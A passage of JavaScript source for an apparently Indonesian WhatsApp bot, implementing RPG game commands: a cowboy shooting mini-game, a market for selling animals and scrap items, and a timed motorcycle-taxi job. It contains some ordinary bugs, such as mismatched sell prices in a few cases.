┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
ReplyRynzz(past)
}
break

case 'koboy': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function random(arr) {
return arr[Math.floor(Math.random() * arr.length)]
}
try {
Alice.tembak = Alice.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {

let kiri = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

if(Alice.tembak.tembak.indexOf("🤠") == 0) {
Alice.tembak.tembak = kiri[0]
} else if(Alice.tembak.tembak.indexOf("🤠") == 1) {
Alice.tembak.tembak = kiri[0]
} else if(Alice.tembak.tembak.indexOf("🤠") == 2) {
Alice.tembak.tembak = kiri[1]
} else if(Alice.tembak.tembak.indexOf("🤠") == 3) {
Alice.tembak.tembak = kiri[2]
} else if(Alice.tembak.tembak.indexOf("🤠") == 4) {
Alice.tembak.tembak = kiri[3]
}

let pos = Alice.tembak.musuh.join(" ") + "\n\n\n" + Alice.tembak.tembak.join(" ")



if(Alice.tembak.musuh.indexOf("🥷") === Alice.tembak.tembak.indexOf("🤠")) return Alice.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return Alice.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
} else if(/kanan/i.test(text)) {

let kanan = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

if(Alice.tembak.tembak.indexOf("🤠") == 0) {
Alice.tembak.tembak = kanan[1]
} else if(Alice.tembak.tembak.indexOf("🤠") == 1) {
Alice.tembak.tembak = kanan[2]
} else if(Alice.tembak.tembak.indexOf("🤠") == 2) {
Alice.tembak.tembak = kanan[3]
} else if(Alice.tembak.tembak.indexOf("🤠") == 3) {
Alice.tembak.tembak = kanan[4]
} else if(Alice.tembak.tembak.indexOf("🤠") == 4) {
Alice.tembak.tembak = kanan[4]
}

let pos = Alice.tembak.musuh.join(" ") + "\n\n\n" + Alice.tembak.tembak.join(" ")



if(Alice.tembak.musuh.indexOf("🥷") === Alice.tembak.tembak.indexOf("🤠")) return Alice.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
]) 
return Alice.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
} else if(/tembak/i.test(text)) {

if(Alice.tembak.tembak.indexOf("🤠") == Alice.tembak.musuh.indexOf("🥷")) {
Alice.tembak = {}
db.data.users[m.sender].money += 1000
ReplyRynzz("Kamu menang!\n\nUang += 1000")
}

} else {
 let randMusuh = [
["🥷", "-", "-", "-", "-"],
["-", "🥷", "-", "-", "-"],
["-", "-", "🥷", "-", "-"],
["-", "-", "-", "🥷", "-"],
["-", "-", "-", "-", "🥷"]
]
 let randAku = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

let musuh = random(randMusuh)
 let aku = random(randAku)

Alice.tembak.musuh = musuh
Alice.tembak.tembak = aku

let pos = Alice.tembak.musuh.join(" ") + "\n\n\n" + Alice.tembak.tembak.join(" ")

if(Alice.tembak.musuh.indexOf("🥷") === Alice.tembak.tembak.indexOf("🤠")) return Alice.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return Alice.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
}
} catch (e) {
throw false
}
}
break

case 'pasar': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

const _armor = db.data.users[m.sender].armor
const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
let type = (args[0] || '').toLowerCase()
let _type = (args[1] || '').toLowerCase()
let jualbeli = (args[0] || '').toLowerCase()
const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Laut | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🦀 Kepiting: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Udang: ${Sudang}
🦑 Cumi: ${Scumi}
🐙 Gurita: ${Sgurita}
🐡 Buntal: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Lumba: ${Slumba}
🐋 Paus: ${Spaus}
🦈 Hiu: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Darat | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🐃 Banteng: ${Sbanteng}
🐅 Harimau: ${Sharimau}
🐘 Gajah: ${Sgajah}
🐐 Kambing: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Kerbau: ${Skerbau}
🐊 Buaya: ${Sbuaya}
🐂 Sapi: ${Ssapi}
🐒 Monyet: ${Smonyet}
🐗 Babi Hutan: ${Sbabihutan}
🐖 Babi: ${Sbabi}
🐔 Ayam: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Contoh penggunaan :*\n═┅═━––––––━––––––๑
#pasar jual ayam [Jumlah]
`.trim()
try {
if (/pasar|toko/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
const sampah = db.data.users[m.sender].sampah
switch (jualbeli) {

case 'jual': 
switch (_type) {
 case 'banteng':
if (db.data.users[m.sender].banteng >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].banteng -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else ReplyRynzz( `Banteng Kamu Tidak Cukup`.trim())
break

case 'harimau':
if (db.data.users[m.sender].harimau >= count * 1) {
db.data.users[m.sender].money += Sharimau * count
db.data.users[m.sender].harimau -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else ReplyRynzz( `Harimau Kamu Tidak Cukup`.trim())
break

case 'gajah':
if (db.data.users[m.sender].gajah >= count * 1) {
db.data.users[m.sender].money += Sgajah * count
db.data.users[m.sender].gajah -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else ReplyRynzz( `Gajah Kamu Tidak Cukup`.trim())
break

case 'kambing':
if (db.data.users[m.sender].kambing >= count * 1) {
db.data.users[m.sender].money += Skambing * count
db.data.users[m.sender].kambing -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else ReplyRynzz( `Kambing Kamu Tidak Cukup`.trim())
break

case 'panda':
if (db.data.users[m.sender].panda >= count * 1) {
db.data.users[m.sender].money += Spanda * count
db.data.users[m.sender].panda -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else ReplyRynzz( `Panda Kamu Tidak Cukup`.trim())
break

case 'buaya':
if (db.data.users[m.sender].buaya >= count * 1) {
db.data.users[m.sender].money += Sbuaya * count
db.data.users[m.sender].buaya -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else ReplyRynzz( `Buaya Kamu Tidak Cukup`.trim())
break

case 'kerbau':
if (db.data.users[m.sender].kerbau >= count * 1) {
db.data.users[m.sender].money += Skerbau * count
db.data.users[m.sender].kerbau -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else ReplyRynzz( `Kerbau Kamu Tidak Cukup`.trim())
break

case 'sapi':
if (db.data.users[m.sender].sapi >= count * 1) {
db.data.users[m.sender].money += Ssapi * count
db.data.users[m.sender].sapi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else ReplyRynzz( `Sapi Kamu Tidak Cukup`.trim())
break

case 'monyet':
if (db.data.users[m.sender].monyet >= count * 1) {
db.data.users[m.sender].money += Smonyet * count
db.data.users[m.sender].monyet -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else ReplyRynzz( `Monyet Kamu Tidak Cukup`.trim())
break

case 'babi':
if (db.data.users[m.sender].babi >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].babi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else ReplyRynzz( `Babi Kamu Tidak Cukup`.trim())
break

case 'babihutan':
if (db.data.users[m.sender].babihutan >= count * 1) {
db.data.users[m.sender].money += Sbabihutan * count
db.data.users[m.sender].babihutan -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else ReplyRynzz( `Babi Hutan Kamu Tidak Cukup`.trim())
break

case 'ayam':
if (db.data.users[m.sender].ayam >= count * 1) {
db.data.users[m.sender].money += Sayam * count
db.data.users[m.sender].ayam -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else ReplyRynzz( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
if (db.data.users[m.sender].kepiting >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].kepiting -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else ReplyRynzz( `Kepiting Kamu Tidak Cukup`.trim())
break

case 'ikan':
if (db.data.users[m.sender].ikan >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].ikan -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else ReplyRynzz( `Ikan Kamu Tidak Cukup`.trim())
break

case 'dory':
if (db.data.users[m.sender].dory >= count * 1) {
db.data.users[m.sender].money += Sdory * count
db.data.users[m.sender].dory -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else ReplyRynzz( `Ikan Dory Kamu Tidak Cukup`.trim())
break

case 'gurita':
if (db.data.users[m.sender].gurita >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].gurita -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else ReplyRynzz( `Gurita Kamu Tidak Cukup`.trim())
break

case 'buntal':
if (db.data.users[m.sender].buntal >= count * 1) {
db.data.users[m.sender].money += Sbuntal * count
db.data.users[m.sender].buntal -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else ReplyRynzz( `Ikan Buntal Kamu Tidak Cukup`.trim())
break

case 'hiu':
if (db.data.users[m.sender].hiu >= count * 1) {
db.data.users[m.sender].money += Shiu * count
db.data.users[m.sender].hiu -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else ReplyRynzz( `Hiu Kamu Tidak Cukup`.trim())
break

case 'orca':
if (db.data.users[m.sender].orca >= count * 1) {
db.data.users[m.sender].money += Sorca * count
db.data.users[m.sender].orca -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else ReplyRynzz( `Paus Orca Kamu Tidak Cukup`.trim())
break

case 'lumba':
if (db.data.users[m.sender].lumba >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].lumba -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else ReplyRynzz( `Lumba Lumba Kamu Tidak Cukup`.trim())
break

case 'paus':
if (db.data.users[m.sender].paus >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].paus -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else ReplyRynzz( `Paus Kamu Tidak Cukup`.trim())
break

case 'lobster':
if (db.data.users[m.sender].lobster >= count * 1) {
db.data.users[m.sender].money += Slobster * count
db.data.users[m.sender].lobster -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else ReplyRynzz( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else ReplyRynzz( `Udang Kamu Tidak Cukup`.trim())
break

case 'cumi':
if (db.data.users[m.sender].cumi >= count * 1) {
db.data.users[m.sender].money += Scumi * count
db.data.users[m.sender].cumi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else ReplyRynzz( `Cumi Kamu Tidak Cukup`.trim())
 break

case 'botol':
if (db.data.users[m.sender].botol >= count * 1) {
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
} else ReplyRynzz( `Botol Kamu Tidak Cukup`.trim())
break

case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
db.data.users[m.sender].money += Skaleng * count
db.data.users[m.sender].kaleng -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else ReplyRynzz( `Kaleng Kamu Tidak Cukup`.trim())
break

case 'kardus':
if (db.data.users[m.sender].kardus >= count * 1) {
db.data.users[m.sender].money += Skardus * count
db.data.users[m.sender].kardus -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else ReplyRynzz( `Kardus Kamu Tidak Cukup`.trim())
break

case 'gelas':
if (db.data.users[m.sender].gelas >= count * 1) {
db.data.users[m.sender].money += Sgelas * count
db.data.users[m.sender].gelas -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else ReplyRynzz( `Gelas Kamu Tidak Cukup`.trim())
break

case 'plastik':
if (db.data.users[m.sender].plastik >= count * 1) {
db.data.users[m.sender].money += Splastik * count
db.data.users[m.sender].plastik -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else ReplyRynzz( `Plastik Kamu Tidak Cukup`.trim())
break
default:
return ReplyRynzz(Kchat)
}
break
default:
return ReplyRynzz(Kchat)
}

} else if (/sell|jual|/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) { 
 case 'banteng':
if (db.data.users[m.sender].banteng >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].banteng -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else ReplyRynzz( `Banteng Kamu Tidak Cukup`.trim())
break

case 'harimau':
if (db.data.users[m.sender].harimau >= count * 1) {
db.data.users[m.sender].money += Sharimau * count
db.data.users[m.sender].harimau -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else ReplyRynzz( `Harimau Kamu Tidak Cukup`.trim())
break

case 'gajah':
if (db.data.users[m.sender].gajah >= count * 1) {
db.data.users[m.sender].money += Sgajah * count
db.data.users[m.sender].gajah -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else ReplyRynzz( `Gajah Kamu Tidak Cukup`.trim())
break

case 'kambing':
if (db.data.users[m.sender].kambing >= count * 1) {
db.data.users[m.sender].money += Skambing * count
db.data.users[m.sender].kambing -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else ReplyRynzz( `Kambing Kamu Tidak Cukup`.trim())
break

case 'panda':
if (db.data.users[m.sender].panda >= count * 1) {
db.data.users[m.sender].money += Spanda * count
db.data.users[m.sender].panda -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else ReplyRynzz( `Panda Kamu Tidak Cukup`.trim())
break

case 'buaya':
if (db.data.users[m.sender].buaya >= count * 1) {
db.data.users[m.sender].money += Sbuaya * count
db.data.users[m.sender].buaya -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else ReplyRynzz( `Buaya Kamu Tidak Cukup`.trim())
break

case 'kerbau':
if (db.data.users[m.sender].kerbau >= count * 1) {
db.data.users[m.sender].money += Skerbau * count
db.data.users[m.sender].kerbau -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else ReplyRynzz( `Kerbau Kamu Tidak Cukup`.trim())
break

case 'sapi':
if (db.data.users[m.sender].sapi >= count * 1) {
db.data.users[m.sender].money += Ssapi * count
db.data.users[m.sender].sapi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else ReplyRynzz( `Sapi Kamu Tidak Cukup`.trim())
break

case 'monyet':
if (db.data.users[m.sender].monyet >= count * 1) {
db.data.users[m.sender].money += Smonyet * count
db.data.users[m.sender].monyet -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else ReplyRynzz( `Monyet Kamu Tidak Cukup`.trim())
break

case 'babi':
if (db.data.users[m.sender].babi >= count * 1) {
db.data.users[m.sender].money += Sbabi * count
db.data.users[m.sender].babi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else ReplyRynzz( `Babi Kamu Tidak Cukup`.trim())
break

case 'babihutan':
if (db.data.users[m.sender].babihutan >= count * 1) {
db.data.users[m.sender].money += Sbabihutan * count
db.data.users[m.sender].babihutan -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else ReplyRynzz( `Babi Hutan Kamu Tidak Cukup`.trim())
break

case 'ayam':
if (db.data.users[m.sender].ayam >= count * 1) {
db.data.users[m.sender].money += Sayam * count
db.data.users[m.sender].ayam -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else ReplyRynzz( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
if (db.data.users[m.sender].kepiting >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].kepiting -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else ReplyRynzz( `Kepiting Kamu Tidak Cukup`.trim())
break

case 'ikan':
if (db.data.users[m.sender].ikan >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].ikan -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else ReplyRynzz( `Ikan Kamu Tidak Cukup`.trim())
break

case 'dory':
if (db.data.users[m.sender].dory >= count * 1) {
db.data.users[m.sender].money += Sdory * count
db.data.users[m.sender].dory -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else ReplyRynzz( `Ikan Dory Kamu Tidak Cukup`.trim())
break

case 'gurita':
if (db.data.users[m.sender].gurita >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].gurita -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else ReplyRynzz( `Gurita Kamu Tidak Cukup`.trim())
break

case 'buntal':
if (db.data.users[m.sender].buntal >= count * 1) {
db.data.users[m.sender].money += Sbuntal * count
db.data.users[m.sender].buntal -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else ReplyRynzz( `Ikan Buntal Kamu Tidak Cukup`.trim())
break

case 'hiu':
if (db.data.users[m.sender].hiu >= count * 1) {
db.data.users[m.sender].money += Shiu * count
db.data.users[m.sender].hiu -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else ReplyRynzz( `Hiu Kamu Tidak Cukup`.trim())
break

case 'orca':
if (db.data.users[m.sender].orca >= count * 1) {
db.data.users[m.sender].money += Sorca * count
db.data.users[m.sender].orca -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else ReplyRynzz( `Paus Orca Kamu Tidak Cukup`.trim())
break

case 'lumba':
if (db.data.users[m.sender].lumba >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].lumba -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else ReplyRynzz( `Lumba Lumba Kamu Tidak Cukup`.trim())
break

case 'paus':
if (db.data.users[m.sender].paus >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].paus -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else ReplyRynzz( `Paus Kamu Tidak Cukup`.trim())
break

case 'lobster':
if (db.data.users[m.sender].lobster >= count * 1) {
db.data.users[m.sender].money += Slobster * count
db.data.users[m.sender].lobster -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else ReplyRynzz( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else ReplyRynzz( `Udang Kamu Tidak Cukup`.trim())
break

case 'cumi':
if (db.data.users[m.sender].cumi >= count * 1) {
db.data.users[m.sender].money += Scumi * count
db.data.users[m.sender].cumi -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else ReplyRynzz( `Cumi Kamu Tidak Cukup`.trim())
 break

case 'botol':
if (db.data.users[m.sender].botol >= count * 1) {
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
} else ReplyRynzz( `Botol Kamu Tidak Cukup`.trim())
break 
case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
db.data.users[m.sender].money += Skaleng * count
db.data.users[m.sender].kaleng -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else ReplyRynzz( `Kaleng Kamu Tidak Cukup`.trim())
break

case 'kardus':
if (db.data.users[m.sender].kardus >= count * 1) {
db.data.users[m.sender].money += Skardus * count
db.data.users[m.sender].kardus -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else ReplyRynzz( `Kardus Kamu Tidak Cukup`.trim())
break
 case 'gelas':
if (db.data.users[m.sender].gelas >= count * 1) {
db.data.users[m.sender].money += Sgelas * count
db.data.users[m.sender].gelas -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else ReplyRynzz( `Gelas Kamu Tidak Cukup`.trim())
break

case 'plastik':
if (db.data.users[m.sender].plastik >= count * 1) {
db.data.users[m.sender].money += Splastik * count
db.data.users[m.sender].plastik -= count * 1
ReplyRynzz( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else ReplyRynzz( `Plastik Kamu Tidak Cukup`.trim())
break 
default:
return ReplyRynzz(Kchat)
}
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
Alice.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
break

case 'ojek': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Ojek'
Alice.misi = Alice.misi ? Alice.misi: {}
if (id in Alice.misi) {
ReplyRynzz( `Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku4 = Math.floor(Math.random() * 10)
let randomaku5 = Math.floor(Math.random() * 10)

let rbrb4 = (randomaku4 * 100000)
let rbrb5 = (randomaku5 * 1000)

var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🛵
✔️ Mendapatkan orderan....
`.trim()

var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Mengantar ke tujuan....
`.trim()

var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Sampai di tujuan....
`.trim()

var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚶
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Ngojek ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += rbrb4
user.exp += rbrb5
user.ojekk += 1

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]

setTimeout(() => {
ReplyRynzz(hsl)
}, 27000)

setTimeout(() => {
ReplyRynzz(dimas4)
}, 25000)

setTimeout(() => {
ReplyRynzz(dimas3)
}, 20000)

setTimeout(() => {
ReplyRynzz(dimas2)
}, 15000)

setTimeout(() => {
ReplyRynzz(dimas)
}, 10000)

setTimeout(() => {
ReplyRynzz('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
